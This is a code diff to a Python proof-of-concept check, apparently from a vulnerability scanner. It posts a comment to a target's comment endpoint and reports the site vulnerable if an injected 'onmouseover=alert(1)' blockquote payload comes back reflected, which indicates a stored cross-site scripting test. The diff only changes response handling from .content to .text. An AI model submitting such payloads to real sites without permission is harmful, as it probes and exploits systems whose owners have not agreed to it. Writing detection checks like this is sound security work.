@@ -61,7 +61,7 @@ class Poc(ABPoc):
             post_id = ''
             try:
                 post_id = re.search(r'post-(?P<post_id>[\d]+)',
-                                    requests.get(self.target).content)
+                                    requests.get(self.target).text)
                 if post_id:
                     post_id = post_id.group('post_id')
             except Exception as e:
@@ -77,7 +77,7 @@ class Poc(ABPoc):
                 'comment_post_ID': post_id,
                 'comment_parent': 0,
             }
-            content = requests.post(verify_url, data=payload).content
+            content = requests.post(verify_url, data=payload).text
             if '<blockquote cite=&#8217;%s onmouseover=alert(1)' % flag in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
